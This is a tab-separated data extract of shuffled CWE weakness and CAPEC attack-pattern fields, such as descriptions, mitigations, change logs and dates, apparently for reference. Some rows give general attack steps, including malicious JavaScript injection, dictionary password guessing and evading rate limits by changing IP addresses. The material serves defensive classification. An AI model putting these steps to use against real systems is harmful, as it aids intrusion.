8440	39	2008-09-08
19668	62	updated Potential_Mitigations
16326	88	Reliance on File Name or Extension of Externally-Supplied File
12901	63	Execute Unauthorized Code or Commands
17720	28	CWE Content Team
8364	81	Confidentiality
15784	62	updated Taxonomy_Mappings
12519	39	2012-10-30
7084	51	2014-06-23
13475	59	Updated Related_Attack_Patterns
17145	69	Incomplete
14358	104	627
9560	51	2014-06-23
17145	43	Simple
14342	28	CWE Content Team
14624	92	Experiment
9240	35	MITRE
10796	51	2014-06-23
20223	39	2011-06-01
20914	28	CWE Content Team
18651	42	Forward declare all functions. This is the recommended solution. Properly forward declaration of all used functions will result in a compiler error if too few arguments are sent to a function.
15924	35	MITRE
5885	60	05
14430	72	An attacker can gain access to sensitive information about the system, including authentication information that may allow an attacker to gain access to the system.
11299	45	Variant
25150	80	Understanding of how to force an MD5 hash collision in X.509 certificates
8257	62	updated Relationships
17981	103	Primary
16682	81	Confidentiality
6863	62	updated Relationships, Taxonomy_Mappings
15472	39	2008-11-24
16280	35	MITRE
10557	76	2019-04-04
9227	69	Draft
7770	61	Draft
9051	39	2008-09-08
21082	81	Availability
5687	21	CWE Content Team
17844	42	Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.
25031	31	1000
5908	42	Compartmentalize the system to have "safe" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.                   Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges.
14724	63	Modify Application Data
11443	92	Explore
17706	35	MITRE
16153	67	High
22693	103	Primary
24526	35	MITRE
16305	104	793
8625	28	CWE Content Team
19463	51	2014-06-23
7550	76	2015-11-09
9493	39	2013-07-17
18578	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
20081	90	Language-Independent
12686	28	CWE Content Team
12129	39	2013-02-21
12120	50	Use secure functions not vulnerable to buffer overflow.
6615	35	MITRE
22660	43	Simple
18779	23	The software does not handle or incorrectly handles when the number of parameters, fields, or arguments with the same name exceeds the expected amount.
23833	81	Access Control
24330	76	2017-08-04
6580	26	Architecture and Design
23903	62	updated Common_Consequences
23495	62	updated Description, Other_Notes
24835	35	Cigital
25362	28	CWE Content Team
22654	26	Architecture and Design
5742	39	2014-07-30
8780	101	CAPEC Content Team
16220	86	http://msdn.microsoft.com/en-us/library/ms537359(v=VS.85).aspx
21783	69	Draft
22514	74	4
12960	28	CWE Content Team
6797	79	Confidentiality
9752	69	Incomplete
13293	90	C#
24194	56	ChildOf
18167	33	Frank Kim
24559	103	Primary
24875	35	MITRE
15271	101	CAPEC Content Team
19132	62	updated Relationships
17590	62	updated Observed_Examples
13032	77	Manual Analysis
19036	47	Modify Data
18904	102	ChildOf
14300	35	MITRE
8406	50	Always invalidate a session ID after the user logout.
9034	39	2017-11-08
11578	28	CWE Content Team
14686	79	Availability
22137	62	Clarified description to include permissions.
8572	73	Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes attacker-modified invalid information to the user on the current web page.
18841	23	An attack of this type exploits a system's configuration that allows an attacker to either directly access an executable file, for example through shell access; or in a possible worst case allows an attacker to upload a file and then execute it. Web servers, ftp servers, and message oriented middleware systems which have many integration points are particularly vulnerable, because both the programmers and the administrators must be in synch regarding the interfaces and the correct privileges for each interface.
20092	28	CWE Content Team
13323	40	The application performs insufficient filtering/canonicalization on the URLs.
24727	39	2008-09-08
22925	91	Architecture and Design
21620	28	CWE Content Team
22727	39	2009-07-27
22192	28	CWE Content Team
23314	62	updated Relationships
9280	62	updated Potential_Mitigations
10947	46	This issue makes it more difficult to modify or maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
16796	79	Authorization
25129	81	Integrity
7480	50	Verify that files have proper access controls set, and reduce the storage of sensitive information to only what is necessary.
9881	62	updated Relationships
24132	79	Availability
11182	50	Any security checks should occur after the data has been decoded and validated as correct data format. Do not repeat decoding process, if bad character are left after decoding process, treat the data as suspicious, and fail the validation process.
23729	28	CWE Content Team
12972	69	Incomplete
21500	31	1000
18729	21	PLOVER
18903	62	updated Potential_Mitigations
6100	74	2
14340	101	CAPEC Content Team
24853	103	Primary
10411	56	ChildOf
17227	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Web Application Scanner                            Web Services Scanner                            Database Scanners
11897	50	Design: Proxy communication to host, so that communications are terminated at the proxy, sanitizing the requests before forwarding to server host.
24548	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
12385	39	2008-08-15
14820	63	DoS: Resource Consumption (CPU)
14847	39	2011-06-27
6624	101	CAPEC Content Team
16127	51	2014-06-23
20323	90	Language-Independent
15881	51	2018-07-31
14210	39	2017-11-08
12093	39	2014-02-18
7080	86	https://www.securecoding.cert.org/confluence/display/seccode/EXP01-A.+Do+not+take+the+sizeof+a+pointer+to+determine+the+size+of+a+type
11724	35	Cigital
13693	28	CWE Content Team
21817	26	Architecture and Design
14211	28	CWE Content Team
6434	59	Updated Description, Description Summary, Relationships, Type (Category -> Attack_Pattern)
19497	39	2011-06-01
24776	39	2017-11-08
5812	94	A successful attack will deny the availability of the satellite communications for authorized users.
7562	91	Architecture and Design
11572	62	updated Name
20814	54	Low
18573	45	Class
15395	31	1000
19241	35	MITRE
22594	39	2014-07-30
24266	35	MITRE
20295	46	When a resource is created or allocated, the developer is responsible for properly releasing the resource as well as accounting for all potential paths of expiration or invalidation, such as a set period of time or revocation.
8948	39	2008-07-01
17211	39	2009-03-10
15883	35	MITRE
7912	35	MITRE
15506	76	2015-11-09
12718	27	None: No specialized resources are required to execute this type of attack.
24232	54	Medium
20105	62	updated References
13022	62	updated References, Relationships
14941	39	2011-06-01
8546	57	Indirect
20326	56	ChildOf
23440	62	updated Common_Consequences
17710	39	2017-11-08
19150	54	Medium
22870	28	CWE Content Team
8037	81	Integrity
22463	39	2011-03-29
12284	35	MITRE
20528	72	Trust afforded to the system in question - based on the malicious certificate - may allow for spoofing or redirection attacks.
15406	39	2010-12-13
22603	28	CWE Content Team
15533	73	Modify the parameters in the fuzzing tool according to the observed error messages. Repeat with enough parameters until the application has been sufficiently mapped.
22932	35	MITRE
23118	62	updated Common_Consequences
10264	81	Integrity
15138	79	Availability
9300	39	2017-11-08
17851	69	Incomplete
21384	96	2008-01-30
15052	23	This type of operating system probe attempts to determine an estimate for how predictable the sequence number generation algorithm is for a remote host. Statistical techniques, such as standard deviation, can be used to determine how predictable the sequence number generation is for a system. This result can then be compared to a database of operating system behaviors to determine a likely match for operating system and version.
15546	31	1000
8015	39	2017-11-08
10983	28	CWE Content Team
10449	55	CAPEC Content Team
17312	45	Class
20698	70	Syslog man page
21867	28	Eric Dalci
21736	80	To bypass non trivial filters in the application
13891	62	updated Relationships, Taxonomy_Mappings
16122	62	updated Time_of_Introduction
14081	39	2008-09-08
22064	35	MITRE
14149	62	updated Relationships, Taxonomy_Mappings
5717	57	Indirect
9534	55	CAPEC Content Team
7153	39	2017-11-08
24718	97	Pretexting via Tech Support
15646	28	CWE Content Team
8946	86	http://blogs.sans.org/appsecstreetfighter/2010/03/12/top-25-series-rank-14-improper-validation-of-array-index/
6473	63	Hide Activities
5731	28	CWE Content Team
14094	28	CWE Content Team
9548	62	updated Related_Attack_Patterns
15266	56	ChildOf
23828	28	CWE Content Team
9207	42	Ensure that error messages only contain minimal details that are useful to the intended audience, and nobody else. The messages need to strike the balance between being too cryptic and not being cryptic enough. They should not necessarily reveal the methods that were used to determine the error. Such detailed information can be used to refine the original attack to increase the chances of success.                   If errors must be tracked in some detail, capture them in log messages - but consider what could occur if the log messages can be viewed by attackers. Avoid recording highly sensitive information such as passwords in any form. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a username is valid or not.                   In the context of SQL Injection, error messages revealing the structure of a SQL query can help attackers tailor successful attack strings.
19320	90	Language-Independent
8561	103	Primary
8075	33	Lincoln Stein
17465	59	Updated Related_Weaknesses
21546	81	Integrity
11516	35	MITRE
20910	56	PeerOf
22001	76	2018-07-31
6988	31	699
8512	103	Primary
7222	62	updated Common_Consequences
14740	35	MITRE
23186	26	Implementation
17758	63	Modify Files or Directories
6257	21	PLOVER
8481	80	Technical understanding of how signature verification algorithms work with data and applications
23822	102	ChildOf
6823	35	MITRE
10611	28	CWE Content Team
22157	43	Simple
12555	100	The MITRE Corporation
12750	62	updated Demonstrative_Examples
21022	35	MITRE
7797	28	CWE Content Team
20052	96	2009-05-13
8037	72	If the value in question is important to data (as opposed to flow), simple data corruption has occurred. Also, if the wrap around results in other conditions such as buffer overflows, further memory corruption may occur.
20390	56	ChildOf
13985	28	CWE Content Team
6888	62	updated Potential_Mitigations
9489	28	CWE Content Team
21771	39	2008-09-08
22744	50	E-mail the temporary password to the registered e-mail address of the user rather than letting the user reset the password online.
15516	35	MITRE
21938	102	ChildOf
15960	39	2019-01-03
6314	28	CWE Content Team
24802	21	Evgeny Lebanidze
9674	39	2014-06-23
20911	91	Implementation
9642	39	2011-06-01
9994	28	CWE Content Team
21906	28	CWE Content Team
15365	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
25109	62	updated Relationships, Taxonomy_Mappings
5936	40	In order to feasibly execute this class of attacks, the attacker must have the ability to hijack a privileged thread.
6116	28	CWE Content Team
7214	35	MITRE
7973	39	2012-05-11
18577	47	Bypass Protection Mechanism
20428	52	This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.                   Specifically, manual static analysis is useful for evaluating the correctness of custom authorization mechanisms.
24365	62	updated Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
21626	62	updated Potential_Mitigations
20126	42	While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).
16717	39	2011-03-29
14002	40	Targeted software is utilizing application framework APIs
9147	53	The MITRE Corporation
19313	88	.NET Misconfiguration: Use of Impersonation
23794	40	Access to the software currently deployed at a victim location. This access is often obtained by leveraging another attack pattern to gain permissions that the adversary wouldn't normally have.
17044	81	Access Control
18232	56	ChildOf
13962	33	Frank Kim
24501	28	CWE Content Team
22562	62	updated Relationships
15855	62	updated Related_Attack_Patterns
15954	101	CAPEC Content Team
23122	62	updated Demonstrative_Examples, Other_Notes, Potential_Mitigations
8234	92	Explore
15155	46	The use of previously-freed memory can have any number of adverse consequences, ranging from the corruption of valid data to the execution of arbitrary code, depending on the instantiation and timing of the flaw. The simplest way data corruption may occur involves the system's reuse of the freed memory. Use-after-free errors have two common and sometimes overlapping causes:                                                Error conditions and other exceptional circumstances.                   Confusion over which part of the program is responsible for freeing the memory.                                          In this scenario, the memory in question is allocated to another pointer validly at some point after it has been freed. The original pointer to the freed memory is used again and points to somewhere within the new allocation. As the data is changed, it corrupts the validly used memory; this induces undefined behavior in the process.             If the newly allocated data chances to hold a class, in C++ for example, various function pointers may be scattered within the heap data. If one of these function pointers is overwritten with an address to valid shellcode, execution of arbitrary code can be achieved.
22945	39	2011-06-01
11826	31	1000
16010	35	MITRE
16303	91	Architecture and Design
22393	43	Simple
25005	69	Incomplete
7692	76	2019-04-04
12736	56	PeerOf
13843	62	updated Relationships, Taxonomy_Mappings
9517	28	CWE Content Team
22473	81	Integrity
9974	92	Explore
16460	101	CAPEC Content Team
21235	28	CWE Content Team
6600	46	Hidden functionality can take many forms, such as intentionally malicious code, "Easter Eggs" that contain extraneous functionality such as games, developer-friendly shortcuts that reduce maintenance or support costs such as hard-coded accounts, etc. From a security perspective, even when the functionality is not intentionally malicious or damaging, it can increase the software's attack surface and expose additional weaknesses beyond what is already exposed by the intended functionality. Even if it is not easily accessible, the hidden functionality could be useful for attacks that modify the control flow of the application.
9585	66	24 Deadly Sins of Software Security
5785	31	1000
19043	28	CWE Content Team
21695	35	MITRE
8682	28	CWE Content Team
25415	100	The MITRE Corporation
20813	99	SANS Software Security Institute
16814	81	Other
12763	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships
17188	63	Other
10542	81	Confidentiality
18212	35	MITRE
18580	103	Primary
23942	62	updated Related_Attack_Patterns
14932	39	2014-07-30
14425	35	MITRE
9737	35	MITRE
12095	63	Quality Degradation
23263	50	Use resource-limiting settings, if possible.
18697	101	CAPEC Content Team
15765	62	updated Description
7829	28	CWE Content Team
8083	89	Detailed
19400	101	CAPEC Content Team
22622	42	Consider load balancing as an option to handle heavy loads.
16177	100	The MITRE Corporation
13014	39	2012-05-11
13294	44	Limited
21587	39	2012-10-30
9326	62	updated Relationships
10927	28	CWE Content Team
14822	62	updated Relationships
10650	39	2014-07-30
20287	56	ChildOf
23445	28	CWE Content Team
9295	59	Updated Related_Weaknesses
12950	35	Cigital
14823	43	Simple
19754	62	updated Name
18873	42	Check your search path before use and remove any elements that are likely to be unsafe, such as the current working directory or a temporary files directory.
10146	63	Unexpected State
19870	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Manual Source Code Review (not inspections)                                                                     Cost effective for partial coverage:                                                                           Focused Manual Spotcheck - Focused manual analysis of source
24406	35	MITRE
12416	39	2019-01-03
8049	62	updated Modes_of_Introduction, Relationships
19755	53	The MITRE Corporation
12758	45	Variant
23583	62	updated Applicable_Platforms, References
20099	62	updated Relationships
9999	91	Implementation
19665	23	A class contains a virtual method, but the method does not have an associated virtual destructor.
13247	43	Simple
8372	28	CWE Content Team
8834	28	CWE Content Team
15775	104	243
17877	69	Incomplete
12635	28	CWE Content Team
25064	62	updated Relationships, Taxonomy_Mappings
9827	21	CWE Content Team
16517	39	2017-11-08
18533	35	MITRE
6001	78	Medium
20295	57	Resultant
25253	81	Confidentiality
24180	38	A web page that contains overly long UTF-8 codes constitute a protocol anomaly, and could be an indication that an attacker is attempting to exploit a vulnerability on the target host.
6115	39	2018-03-27
22859	30	Joel Scambray
5977	80	Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap requires a more in-depth knowledge and higher skill level.
8662	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
17881	35	MITRE
18022	94	Run Arbitrary Code
19807	32	The Open Web Application Security Project (OWASP)
22418	39	2009-01-12
8802	23	The software performs a calculation that can produce an integer overflow or wraparound, when the logic assumes that the resulting value will always be larger than the original value. This can introduce other weaknesses when the calculation is used for resource management or execution control.
22266	59	Updated Description
10944	88	Unrestricted Externally Accessible Lock
13909	74	2
17838	35	MITRE
19771	35	MITRE
23360	47	Gain Privileges
7527	63	Read Application Data
7708	35	MITRE
13811	86	http://blogs.technet.com/b/srd/archive/2010/08/23/an-update-on-the-dll-preloading-remote-attack-vector.aspx
9742	102	ChildOf
23228	35	MITRE
19129	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Bytecode Weakness Analysis - including disassembler + source code weakness analysis                            Binary Weakness Analysis - including disassembler + source code weakness analysis                                                                     Cost effective for partial coverage:                                                                           Binary / Bytecode Quality Analysis                            Binary / Bytecode simple extractor – strings, ELF readers, etc.
11328	35	MITRE
9681	103	Primary
11287	33	Dinis Cruz
13341	55	CAPEC Content Team
8000	39	2008-07-01
7589	62	updated Time_of_Introduction
11663	102	ChildOf
15357	42	While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).
20170	39	2017-01-19
25402	43	Simple
12027	80	Brute forcing encryption does not require much skill.
6015	102	ChildOf
17953	103	Primary
24867	77	Automated Static Analysis
17034	23	An adversary, through a malicious web page, accesses application specific functionality by leveraging interfaces registered through WebView's addJavascriptInterface API. Once an interface is registered to WebView through addJavascriptInterface, it becomes global and all pages loaded in the WebView can call this interface.
13166	35	MITRE
14853	26	Implementation
16795	69	Incomplete
12376	70	CERT Advisory CA-1997-05 MIME Conversion Buffer Overflow in Sendmail Versions 8.8.3 and 8.8.4
22441	68	Be aware that salts will not reduce the workload of a targeted attack against an individual hash (such as the password for a critical person), and in general they are less effective than other hashing techniques such as increasing the computation time or memory overhead. Without a built-in workload, modern attacks can compute large numbers of hashes, or even exhaust the entire space of all possible passwords, within a very short amount of time, using massively-parallel computing and GPU, ASIC, or FPGA hardware.
15745	61	Draft
17280	35	MITRE
8388	28	CWE Content Team
14131	62	updated Common_Consequences
9970	81	Other
10137	62	updated Common_Consequences
19131	35	Cigital
12926	44	SOAR Partial
15254	62	updated Applicable_Platforms, Taxonomy_Mappings
9799	35	MITRE
23957	90	Language-Independent
18941	28	CWE Content Team
20108	39	2010-09-27
18562	28	CWE Content Team
24837	62	updated References, Relationships
20738	43	Simple
18086	59	Updated Related_Weaknesses
11032	28	CWE Content Team
13111	24	MITRE
22572	53	The MITRE Corporation
8317	28	Eric Dalci
9921	62	updated Description, Relationships, Relationship_Notes, Taxonomy_Mappings
15399	86	http://software-security.sans.org/blog/2010/03/24/top-25-series-rank-21-incorrect-permission-assignment-for-critical-response
18641	35	MITRE
20049	69	Draft
23991	21	PLOVER
5710	35	MITRE
22444	62	updated Description, Potential_Mitigations
7505	95	The attacker finds a bug in a program running with elevated privileges.
11173	102	CanFollow
17401	97	Directory Indexing
9542	35	Cigital
14949	81	Availability
18379	56	ChildOf
17582	35	MITRE
22254	62	updated Observed_Examples
8695	28	CWE Content Team
7449	86	http://www.thenewsh.com/~newsham/format-string-attacks.pdf
22466	62	updated Relationships
10487	28	CWE Content Team
18415	28	CWE Content Team
9163	62	updated Causal_Nature, Relationships
12384	69	Draft
20924	39	2014-07-30
8612	85	231
24641	48	08
12232	62	updated Description, Relationships
18453	46	When the length value exceeds the size of the destination, a buffer overflow could occur.
18944	28	CWE Content Team
6284	85	74
15125	35	MITRE
9684	42	Protect information stored in cache.
8362	62	updated Name, Relationships
21445	28	CWE Content Team
18826	42	Use atomic operations on shared variables. Be wary of innocent-looking constructs such as "x++". This may appear atomic at the code layer, but it is actually non-atomic at the instruction layer, since it involves a read, followed by a computation, followed by a write.
12588	103	Primary
18615	39	2009-07-27
22603	39	2011-09-13
15570	39	2014-06-23
8552	91	Architecture and Design
22316	88	Path Traversal: '.../...//'
17839	48	07
12692	42	Fully check the hostname of the certificate and provide the user with adequate information about the nature of the problem and how to proceed.
6171	101	CAPEC Content Team
25233	34	Optimizations built into the design of a product can have unintended consequences during execution.
14368	35	MITRE
7698	59	Updated Related_Weaknesses
5696	56	ChildOf
16992	42	Remove the use of static variables used between servlets. If this cannot be avoided, use synchronized access for these variables.
9659	62	updated White_Box_Definitions
20423	62	updated Relationships, Taxonomy_Mappings
16945	62	updated Potential_Mitigations
21175	91	Operation
23470	23	The product uses an automated mechanism such as machine learning to recognize complex data inputs (e.g. image or audio) as a particular concept or category, but it does not properly detect or handle inputs that have been modified or constructed in a way that causes the mechanism to detect a different, incorrect concept.
24870	43	Simple
24253	39	2015-12-07
14901	35	MITRE
22303	33	Microsoft Corporation
24726	69	Incomplete
10459	50	To mitigate this type of an attack, an organization can enable ingress filtering. Additionally modifications to BGP like black hole routing and sinkhole routing(RFC3882) help mitigate the spoofed source IP nature of these attacks.
14945	62	updated Time_of_Introduction
14900	35	MITRE
15359	103	Primary
20916	35	Cigital
24757	35	Cigital
12119	39	2017-11-08
10997	31	699
5621	28	CWE Content Team
18191	71	2008
11096	77	Dynamic Analysis with Manual Results Interpretation
10172	26	Architecture and Design
8397	89	Detailed
17392	28	CWE Content Team
23188	28	CWE Content Team
8110	62	updated Maintenance_Notes, Relationships
21980	55	CAPEC Content Team
24961	31	699
6048	39	2019-01-03
23637	28	CWE Content Team
12958	104	778
18076	100	The MITRE Corporation
10476	70	Soundsquatting: Uncovering the Use of Homophones in Domain Squatting
16848	39	2010-12-13
24108	62	updated Observed_Examples, Relationships
8934	51	2014-06-23
18069	39	2009-01-12
23623	62	updated Common_Consequences, Other_Notes
24044	60	18
24220	39	2010-06-21
21854	21	PLOVER
21713	73	Use a scanner tool to dynamically add directories/files to include their scan based upon data obtained in initial probes.
16864	25	Medium
24538	61	Draft
18119	28	CWE Content Team
24528	35	MITRE
14781	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
21800	28	CWE Content Team
5700	35	MITRE
16169	35	MITRE
19706	62	updated Relationships
23128	35	MITRE
9675	42	Choose a language which is not subject to these casting flaws.
21092	40	The adversary requires logical access to the target network. The TCP connect Scan requires the ability to connect to an available port and complete a 'three-way-handshake' This scanning technique does not require any special privileges in order to perform. This type of scan works against all TCP/IP stack implementations.
18453	23	The software uses a sequential operation to read or write a buffer, but it uses an incorrect length value that causes it to access memory that is outside of the bounds of the buffer.
24490	32	The Open Web Application Security Project (OWASP)
10854	39	2009-05-27
8903	28	CWE Content Team
22752	62	updated Potential_Mitigations
18564	48	09
14832	85	488
7406	59	Updated Related_Weaknesses
21890	35	MITRE
21672	28	CWE Content Team
7949	103	Primary
12562	76	2017-08-04
6189	43	Simple
6985	35	MITRE
23148	35	MITRE
15188	73	Use web browser to inject input through text fields or through HTTP GET parameters
8232	35	MITRE
18275	39	2017-11-08
17904	28	CWE Content Team
21536	75	This is not a perfect solution, since 100% accuracy and coverage are not feasible.
24834	88	Out-of-bounds Read
11462	56	ChildOf
19826	35	MITRE
9159	77	Automated Static Analysis - Binary or Bytecode
14281	56	ChildOf
10535	103	Primary
18548	92	Exploit
10204	47	Other
18367	35	MITRE
21465	25	Medium
8379	49	2016
14808	62	updated Potential_Mitigations
10118	35	Veracode
13850	49	1981
6146	35	MITRE
6905	33	Nadia Alramli
25262	39	2019-01-03
13525	28	CWE Content Team
15544	21	PLOVER
25334	23	A method for a class performs an operation that directly      accesses a member element from another class.
9357	76	2019-04-04
10186	90	Java
17426	62	updated Relationships
19694	55	CAPEC Content Team
20239	39	2019-06-20
13622	62	updated Relationships
21464	79	Confidentiality
13902	39	2008-07-01
8431	28	CWE Content Team
18867	28	CWE Content Team
19070	45	Variant
9979	93	Defense in Depth
8923	39	2012-10-30
10795	45	Variant
13428	35	MITRE
13023	105	Mobile
11717	92	Exploit
12954	63	Gain Privileges or Assume Identity
18546	90	C++
23911	81	Integrity
9782	28	CWE Content Team
17820	72	Data represented by unserializable objects can be corrupted.
14305	77	Black Box
15207	35	MITRE
13611	35	MITRE
12582	35	MITRE
9428	62	updated Potential_Mitigations, Relationships
7572	86	http://en.wikipedia.org/wiki/Cross-site_request_forgery
21393	62	updated Demonstrative_Examples
13247	23	The software uses a cross-domain policy file that includes domains that should not be trusted.
10144	50	Implementation: Check the integrity of the dynamically linked libraries before use them.
10482	23	The software validates input before applying protection mechanisms that modify the input, which could allow an attacker to bypass the validation via dangerous inputs that only arise after the modification.
12643	39	2008-09-08
8890	81	Confidentiality
21357	62	updated Relationships, Taxonomy_Mappings
23847	35	MITRE
6120	35	MITRE
8903	62	updated Other_Notes
6917	25	High
24591	88	Invokable Control Element with Signature Containing an Excessive Number of Parameters
21682	35	MITRE
21339	28	CWE Content Team
8130	79	Integrity
15830	59	Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit
15533	73	If the application rejects the large amount of fuzzing messages from the same host machine, the attacker needs to hide the attacks by changing the IP addresses or other credentials.
14689	39	2011-09-13
24229	62	updated Name
24479	24	MITRE
13179	39	2009-05-27
10311	62	updated Relationships
7314	103	Primary
21916	46	Resources that may contain sensitive data include documents, packets, messages, databases, etc. While this data may be useful to an individual user or small set of users who share the resource, it may need to be removed before the resource can be shared outside of the trusted group. The process of removal is sometimes called cleansing or scrubbing.             For example, software that is used for editing documents might not remove sensitive data such as reviewer comments or the local pathname where the document is stored. Or, a proxy might not remove an internal IP address from headers before making an outgoing request to an Internet site.
10788	39	2009-05-27
5906	28	CWE Content Team
24872	103	Primary
22200	61	Stable
16485	31	1000
5781	42	Choose a language or tool that provides automatic memory management, or makes manual memory management less error-prone.                   For example, glibc in Linux provides protection against free of invalid pointers.                   When using Xcode to target OS X or iOS, enable automatic reference counting (ARC) [REF-391].                   To help correctly and consistently manage memory when programming in C++, consider using a smart pointer class such as std::auto_ptr (defined by ISO/IEC ISO/IEC 14882:2003), std::shared_ptr and std::unique_ptr (specified by an upcoming revision of the C++ standard, informally referred to as C++ 1x), or equivalent solutions such as Boost.
7273	91	Implementation
5617	35	MITRE
23165	103	Primary
11214	69	Draft
25058	28	CWE Content Team
13893	35	MITRE
5628	62	updated Potential_Mitigations, Time_of_Introduction
22380	28	CWE Content Team
12175	54	High
24602	46	In environments such as embedded or mobile devices, power can be a limited resource such as a battery, which cannot be automatically replenished by the software itself, and the device might not always be directly attached to a reliable power source. If the software uses too much power too quickly, then this could cause the device (and subsequently, the software) to stop functioning until power is restored, or increase the financial burden on the device owner because of increased power costs.             Normal operation of an application will consume power. However, in some cases, an attacker could cause the application to consume more power than intended, using components such as:                                                Display                   CPU                   Disk I/O                   GPS                   Sound                   Microphone                   USB interface
24827	62	updated Type
24770	28	CWE Content Team
20624	35	MITRE
24450	50	Uniformly throttle all requests in order to make it more difficult to consume resources more quickly than they can again be freed.
13907	71	2010
23628	105	Web Based
6299	91	Architecture and Design
21834	26	Implementation
23776	26	Implementation
24542	28	CWE Content Team
25382	32	The Open Web Application Security Project (OWASP)
5667	102	ChildOf
19382	39	2012-05-11
16142	31	1000
6379	73	Try all words in the dictionary, as well as common misspellings of the words as passwords for the chosen username(s).
20201	35	MITRE
17951	28	CWE Content Team
19821	91	Operation
7769	28	CWE Content Team
14325	69	Draft
22542	35	MITRE
7440	44	High
19456	42	Consider using encryption in the cache.
15110	42	Use a cryptographic algorithm that is currently considered to be strong by experts in the field.
20168	91	Implementation
20791	35	MITRE
6218	23	This attack targets the format string vulnerabilities in the syslog() function. An attacker would typically inject malicious input in the format string parameter of the syslog function. This is a common problem, and many public vulnerabilities and associated exploits have been posted.
20892	39	2011-06-01
12243	35	MITRE
21513	26	Architecture and Design
18470	35	MITRE
24664	62	updated Relationships, Taxonomy_Mappings
13354	62	updated Common_Consequences
8327	62	updated Common_Consequences, Other_Notes
8123	85	650
20131	35	MITRE
10949	97	Poison Web Service Registry
24171	42	Verify return values are correct and do not supply sensitive information about the system.
16232	62	updated Common_Consequences
13604	59	Updated Related_Weaknesses
19722	35	MITRE
11997	35	MITRE
10186	88	clone() Method Without super.clone()
19574	52	Whether this issue poses a vulnerability will be subject to the intended behavior of the application. For example, a search engine might intentionally provide redirects to arbitrary URLs.
20731	25	Medium
6545	39	2008-09-08
10103	39	2010-06-21
17329	69	Draft
21949	28	CWE Content Team
22435	103	Primary
13300	45	Variant
23957	88	Use of Expired File Descriptor
12111	101	CAPEC Content Team
7690	23	HTTP Request Smuggling results from the discrepancies in parsing HTTP requests between HTTP entities such as web caching proxies or application firewalls. Entities such as web servers, web caching proxies, application firewalls or simple proxies often parse HTTP requests in slightly different ways. Under specific situations where there are two or more such entities in the path of the HTTP request, a specially crafted request is seen by two attacked entities as two different sets of requests. This allows certain requests to be smuggled through to a second entity without the first one realizing it.
14591	23	The program checks a value to ensure that it is less than or equal to a maximum, but it does not also verify that the value is greater than or equal to the minimum.
12686	35	MITRE
23989	73	Brute force guessing of function names / actions
20397	28	CWE Content Team
7356	30	Adrienne Porter Felt
22343	79	Integrity
6754	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
15792	28	Eric Dalci
12914	59	Updated Related_Attack_Patterns
11338	47	Modify Data
25037	35	MITRE
14101	43	Simple
18388	55	CAPEC Content Team
19237	78	Low
21156	100	The MITRE Corporation
17429	56	ChildOf
21282	28	CWE Content Team
11767	62	updated Demonstrative_Examples, Potential_Mitigations
14236	39	2017-11-08
18332	96	2010-10-25
24956	101	CAPEC Content Team
21029	79	Confidentiality
16233	56	ChildOf
18080	100	The MITRE Corporation
19082	62	updated Relationships
12581	62	updated Relationships
14960	62	updated Name
7421	26	Implementation
10038	81	Confidentiality
20927	93	Defense in Depth
8719	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
8738	61	Draft
13973	39	2009-01-12
7191	39	2017-11-08
19319	39	2014-07-30
10443	31	699
17167	62	updated Common_Consequences
9245	35	MITRE
12514	92	Exploit
10663	39	2008-09-08
10436	59	Updated Description Summary
7101	61	Draft
24174	35	MITRE
11624	69	Draft
19342	100	The MITRE Corporation
21811	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Configuration Checker
15806	28	CWE Content Team
25395	91	Architecture and Design
17154	31	1000
22278	62	updated Time_of_Introduction
21488	44	High
20497	28	CWE Content Team
6695	28	CWE Content Team
18092	28	CWE Content Team
15593	28	CWE Content Team
16236	74	2
8213	56	ChildOf
15606	39	2011-06-01
6675	35	MITRE
19329	28	CWE Content Team
15196	27	A tool that allows for the sending of customized HTTP requests is required.
9490	62	added/updated demonstrative examples
10098	62	updated Background_Details, Common_Consequences
18338	100	The MITRE Corporation
22662	91	Implementation
22521	62	updated Common_Consequences
23214	35	MITRE
18963	28	CWE Content Team
16694	62	updated Common_Consequences
14878	33	US-CERT
